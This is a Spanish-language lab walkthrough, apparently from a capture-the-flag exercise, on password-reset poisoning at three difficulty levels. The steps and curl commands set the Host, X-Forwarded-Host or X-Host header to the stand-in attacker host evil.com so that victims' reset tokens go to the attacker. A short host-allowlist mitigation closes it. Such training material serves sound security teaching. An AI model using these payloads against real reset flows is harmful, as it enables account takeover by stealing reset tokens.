Easy — Envenenamiento via header Host

El servidor construye la URL de reset como f"http://{request.host}/reset_poisoning/confirm/{token}".
Si modificas el header Host en la petición, el link generado usará tu dominio.

  1. Intercepta POST /reset_poisoning/request con Burp Suite.
  2. Reemplaza el header Host: TARGET_IP por Host: evil.com.
  3. El email generado contendrá http://evil.com/reset_poisoning/confirm/TOKEN.
  4. Si la víctima hace clic, el token llega a tu servidor.
curl -X POST http://{{ target_ip }}/reset_poisoning/request \
  -H "Host: evil.com" \
  -d "email=victim@example.com"

Medium — Envenenamiento via X-Forwarded-Host

El Host está validado, pero el servidor confía en X-Forwarded-Host (typical en proxies inversos mal configurados).

curl -X POST http://{{ target_ip }}/reset_poisoning/request \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=victim@example.com"

Hard — Envenenamiento via X-Host

Ambos headers anteriores son ignorados. El servidor también procesa X-Host, que simula un proxy legacy que reescribe el host.

curl -X POST http://{{ target_ip }}/reset_poisoning/request \
  -H "X-Host: evil.com" \
  -d "email=victim@example.com"

Una vez que el link envenenado está en la bandeja, haz clic en él para que el servidor lo procese y entregue la flag.

Mitigación

# Configurar una whitelist de hosts permitidos
ALLOWED_HOSTS = ['myapp.com', 'www.myapp.com']
if request.host not in ALLOWED_HOSTS:
    abort(400)
